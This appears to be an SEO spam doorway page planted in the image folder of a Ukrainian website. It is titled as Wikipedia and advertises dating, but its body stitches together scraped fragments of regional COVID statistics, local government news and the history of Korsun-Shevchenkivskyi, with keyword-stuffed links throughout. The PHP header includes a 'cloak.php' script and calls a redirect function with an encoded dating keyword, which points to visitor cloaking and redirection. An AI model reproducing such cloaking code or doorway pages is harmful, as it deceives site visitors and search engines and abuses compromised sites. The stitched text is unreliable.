<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%bc%d1%96%d1%81%d1%82%d0%be+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%9a%d0%be%d1%80%d1%81%d1%83%d0%bd%d1%8c-%d0%a8%d0%b5%d0%b2%d1%87%d0%b5%d0%bd%d0%ba%d1%96%d0%b2%d1%81%d1%8c%d0%ba%d0%b8%d0%b9+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Корсунь-Шевченківський — Вікіпедія</title>
	<meta name="description" content="Сайт знайомств міста Корсунь-Шевченківський ❤❤️ - безкоштовні онлайн знайомства з дівчатами і чоловіками, знайомство в інтернеті" />
	<link rel="canonical" href="https://masage.od.ua/img/248/jatyc-znayomstva-msto.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/398/fiv-znayomstva-z.php">знайомства з чоловіком в Переяслав Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/237/revyx-5-hvilinne-znayomstvo-bunge.php">5-хвилинне знайомство Бунге Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/352/fi-bezkoshtovne-pdklyuchennya-poruch.php">безкоштовне підключення поруч Каховка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/240/pos-oblast-znayomstva.php">область знайомства в Надвірна Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Знайомства місто поблизу Корсунь-Шевченківський Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>В Україні наразі діє ринок природного газу. Тому кожен споживач газу може обирати постачальника газу на власний розсуд. Детально розповідаємо, як це зробити. Рівень кисневого забезпечення ліжок, визначених для лікування хворих на ковід, збільшують в області. З 2 місць для лікування пацієнтів з коронавірусом у лікарнях 2  На цьому в ході брифінгу наголосив в. Нині приймають пацієнтів з ковідом, які потребують госпіталізації, у 23 медичних закладах області.</p>
<p>Стаціонарне лікування тут проходять особи. З них на кисні — хворих. За добу одужали осіб. На жаль, померли — троє. Методом ПЛР від початку року протестували 9 жителів області. У 4 випадках виявили наявність РНК коронавірусу. Найбільше випадків зафіксували у Черкасах, Умані, Смілі, Каневі та Черкаському районі.</p>
		
	<p>Про це у ході брифінгу повідомила керівниця обласного лабцентру Людмила Кравченко. Зворотній зв'язок з владою    «Гаряча лінія» для інформування при надзвичайних ситуаціях Телефон  Актуально Інформація щодо прийняття та та розселення переселенців на тереторії району Можливість розміщення сімей переселенців з АРК та м.</p>
<p>Оголошення Інформаційне повідомлення. Схвалено на засіданні аукціонної комісії 10липня року. З 1 ЖОВТНЯ — НОВІ РАХУНКИ ДЛЯ СПЛАТИ ПОДАТКІВ! Оголошення центральна районна лікарня. Останнє з фотогалереї. Опитування Які із за значених соціальних проблем Вас найбільше турбує? деградація населення алкоголізм наркоманія поширення соціально небезпечних хвороб важко відповісти. Інформує Мін'юст         Переглянути. Доступ до публ. інформації   Переглянути. Корсунь-Шевченківський офіційна сторінка - Новини. Представників інститутів громадянського суспільства Черкащини запрошують долучитися до формування громадської ради при ОДА П'ятниця, 12 лютого ,   П редставників інститутів громадянського суспільства Черкаської області запрошують до формування складу громадської ради при ОДА.</p>
<p>В області зняли тимчасові обмеження в русі на державних дорогах П'ятниця, 12 лютого ,   У Черкаській області зняли обмеження руху вантажівок трьома дорогами у напрямку Києва. Старт нової програми «Доступна іпотека» має бути швидким і ефективними Вівторок, 02 лютого ,   Нещодавно Урядом оприлюднено доопрацьовану постанову від  Обласний Департамент АПР збирає пропозиції для покращення програми розвитку рибного господарства водойм Вівторок, 02 лютого ,   Департамент агропромислового розвитку Черкаської обласної державної адміністрації просить зацікавлених осіб надати пропозиції до розроблення проекту Програми розвитку рибного господарства водойм Черкаської області та поліпшення їх екологічного стану.</p>
		
			
				<div>На Черкащині на дитину впав бетонний балкон</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/27sLuwqQ_wU' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>У Черкаській ОДА обговорили хід проведення земельної реформи фото, відео Понеділок, 01 лютого ,   Проведення земельної реформи, порядок проведення земельних торгів, механізм розпорядження землями сільськогосподарського призначення територіальними громадами. Яким буде механізм компенсації за використання електроенергії Понеділок, 01 лютого ,   Деякі категорії споживачів електричної енергії Черкащини отримають компенсації за її використання. Тарифи на тепло й гарячу воду на місцях не мають підвищуватися — Володимир Зеленський П'ятниця, 29 січня ,   На нараді з міськими головами та керівництвом НАК «Нафтогаз України» домовлено, що на місцях тарифи на тепло та гарячу воду не зростуть.</p>
<p>Черкащани, у яких встановлене електроопалення, отримають компенсацію від держави Четвер, 28 січня ,   Громадяни, у яких встановлене електроопалення, отримають компенсації від держави. На Черкащині завершився процес затвердження місцевих бюджетів на рік Четвер, 28 січня ,   Попри непрості дебати, 25 січня року депутати Корсунь-Шевченківської міської ради прийняли рішення про бюджет громади на рік.</p>
<p>З понеділка для закладів освіти Черкащини скасовуються додаткові обмеження П'ятниця, 22 січня ,   Додаткові обмеження для закладів освіти області, що були встановлені на період січня, втратять силу 25 січня.</p><a id='z1'></a><h3>м. Корсунь-Шевченківський, вул. В. Сергієнка, 4а (ТСЦ МВС № 7144)</h3><p>Субсидії дозволяють оплачувати черкащанам неповну вартість житлово-комунальних послуг Середа, 20 січня ,   Головним механізмом забезпечення соціального захисту населення при оплаті житлово-комунальних послуг є програма житлових субсидій. полк перейшов на бік повстанців.</p>
<p>Дізнавшись про розгром своїх авангардних військ під Жовтими Водами , Потоцький поспішно відступив під Корсунь і зайнявши його, віддав на пограбування військам, а потім наказав вщент спалити. поблизу Корсуня військо Богдана Хмельницького у битві, відомій, як Корсунська , розгромило майже всю польську армію. Після неї Україна почала будуватися як незалежна держава. Корсунський реєстровий полк було перетворено на військово-адміністративну одиницю. Він був одним з найбільших в Україні. З Корсуня гетьман відправив 16 листів, 3 універсали та 1 наказ.</p>
<p>Хмельницький проводив у Корсуні ради, збирав тут військо для нових походів, приймав іноземних послів. У Корсунь був взятий козаками лівобережного гетьмана Івана Брюховецького та московсько-калмицьким військом. Нападникам не вдалося захопити лише Корсунський замок. Гарнізон міста намагався протистояти загонам Самойловича, але фортецю було взято штурмом.</p>
<p>Після прийняття у  р.</p><strong><a id='z2'></a><h2>Корсунь-Шевченківський</h2></strong><p>поляками рішення про відновлення козацтва на Правобережній Україні місто почало відбудовуватися. У х за наказом гетьмана Богдана Хмельницького тут збудовано Корсунський замок. Корсунський замок за ілюстрацією був у формі квадрата з 4-ма вежами по кутах, оточений ровом, валом та дубовим палісадом, до замку вів розвідний міст, у кінці мосту була брама зі стрільницями та з приміщеннями для козаків. Над Брамою було літнє житлове помешкання.</p>
<p>Брама була наново зведена в  р. за старости Яблоновського. Всередині замку стояв будинок, у якому проживав губернатор, стайня, возівня, будинок для козаків, пекарня, кухня тощо. Посередині була дворівнева вежа з бійницями, у якій мешкали козаки.</p><strong><a id='z3'></a><h2>Корсунь-Шевченківська багатопрофільна лікарня – Черкаська область</h2></strong><p>Біля неї знаходилася, частково зруйнована студня. під час повстання проти Польщі Корсунський полк на чолі із полковником Захарієм Іскрою підтримав цей виступ. У —  рр. за наказом московської влади більшу частину козаків та цивільних мешканців міста було силою переселено на Лівобережжя. Сам Корсунь було повністю спалено. У XVIII ст.</p>
		
	<p>Корсунщина була одним із центрів визвольної боротьби на Правобережжі , у тому числі гайдамацького руху, який постійно наростав починаючи з часу розформування Корсунського полку у  р. На цій території весь час діяло декілька гайдамацьких загонів. Гайдамаки нападали на шляхетські маєтки, розорюючи їх.</p><a id='z4'></a><h3>Крутимося для тебе</h3><p>Декілька разів вони захоплювали Корсунь. Апогеєм гайдамацького руху було повстання  р. Під час нього було вирізано всіх поляків та євреїв , зруйновано костьоли. Але в результаті військової підтримки Російської імперії цей виступ було придушено. Протягом декількох років відбувалися локальні виступи гайдамаків, але полякам урешті-решт вдалося встановити свій контроль над краєм і через декілька років рух гайдамаків тут повністю згас. Корсунщину знову було перетворено на безлюдну пустку. За люстрацією року в Корсуні був будинок.</p>
<p>Корсунський замок був перетворений на в'язницю, де тримали прихильників православної віри. З  р. Корсунь став власністю князя Станіслава Понятовського  — племінника останнього польського короля. Місто наново закладене , має 25 мурованих будинків. Станіслав Понятовський збудував тут фабрики сукна, замші, селітри, плантації шовковиці, винниці, розводив расових коней.</p>
		
			<br><ul>
			
				<li>❤ ЗНАЙОМСТВА Корсунь-Шевченківський ❤ - .</li>
			
				<li>Навігаційне меню.</li>
			
				<li>регіон знайомств Калуш Україна.</li>
			
				<li>сайти знайомств чоловіки Кадіївка Україна.</li>
			
			</ul>
		
	<p>Заклав тут для молоді школу танців. У всьому йому спочатку допомагав французький художник і архітектор Жан Анрі Мюнц. Збудував тут шпиталь на три покої. Започаткував «касу допомоги» для погорільців. Однак добудовував палац вже шотландський архітектор на польській службі Ян Дісіор Ліндсей.</p><img src="https://i.ytimg.com/vi/_qnYD9NWwUk/hqdefault.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>За люстрацією року на одному з островів, який називали «Острів», стояв двоповерховий мурований палац, що мав 26 покоїв, 3 муровані будинки, 2 стайні. Зала була висотою в два поверхи, 15 на 10 метрів. Стайні для коней мали по 50 метрів довжини. Другий острів називався «Деніс» на ньому був закладений парк з оранжереями та теплицями.</p>
<p>Крім того, було ще 5 менших островів без назви.</p><strong><a id='z5'></a><h2>Знайомства Корсунь-Шевченківський</h2></strong><p>В палаці містилася велика колекція археологічних знахідок, викопаних в околицях Корсуня, у тому числі золотих виробів. Всього в місті нараховувалось будинків, з них 23 шляхетські, 34 єврейські, 25 мурованих. В центрі міста — ринкова площа у формі квадрата, по трьох сторонах були муровані будинки, а з четвертої «замок» — будинок губернатора, оточений глибоким ровом. Воно входило до Богуславського повіту Київського намісництва з  р.</p>
<p>Корсуньський маєток купив у Понятовського за тисяч карбованців сріблом російський імператор Павло І. Він у році подарував його міністру юстиції генерал-прокурору Росії князю П. Лопухіну, який знову закріпачив селян. Місцеві міщани і селяни були незадоволені новим становищем і борючись проти закріпачення протягом п'яти років доводили свої вольності, посилали скарги до Петербурга. В році сюди прибула спеціальна урядова комісія із каральним загоном і привела корсунців до покори. Організаторів виступів К.</p>
<p>Тетянченка і Г. Калюжного було заслано на вічне поселення до Сибіру , 29 чоловік кинуто до богуславської в'язниці, решту покарано канчуками і різками. В році князь Лопухін збудував у Корсуні суконну фабрику. місто входило до Канівського повіту Київської губернії. тут відбувся виступ селян у рамках Київської козаччини. Тоді серед них поширилися чутки, що той, хто запишеться до ополчення для участі в Кримській війні, буде звільнений від кріпацтва.</p>
<p>У Корсуні селяни зібрали натовп понад 4 тисяч із мешканців Корсуня, Ситників, Моринців, Виграєва , Киченців, Корнилівки, Гарбузини, Бровахи і зажадали від князя дати їм грамоту на звільнення. Сталася сутичка з поліцією, у результаті якої було вбито 13, поранено 27 селян.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/248/xesu-znayomstva-shvidkst.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/467/moxuc-znayomstva-z-zhnkoyu.php">знайомства з жінкою Богодухів Україна</a></li><li><a href="https://masage.od.ua/img/471/pike-naykrashe-mstse.php">найкраще місце для підключення Селидове Україна</a></li><li><a href="https://masage.od.ua/img/361/fazuh-zona-shvidksnih.php">зона швидкісних знайомств Переяслав Україна</a></li><li><a href="https://masage.od.ua/img/137/paqon-znayomstva-zaraz-v.php">знайомства зараз в Скадовськ Україна</a></li><li><a href="https://masage.od.ua/img/208/hyqus-ponad-40-znayomstv.php">понад 40 знайомств Сновськ Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#z1'>м. Корсунь-Шевченківський, вул. В. Сергієнка, 4а (ТСЦ МВС № 7144)</a></li>
<li><a href='#z2'>Корсунь-Шевченківський</a></li>
<li><a href='#z3'>Корсунь-Шевченківська багатопрофільна лікарня – Черкаська область</a></li>
<li><a href='#z4'>Крутимося для тебе</a></li>
<li><a href='#z5'>Знайомства Корсунь-Шевченківський</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/471/ry-naykrashe-mstse.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>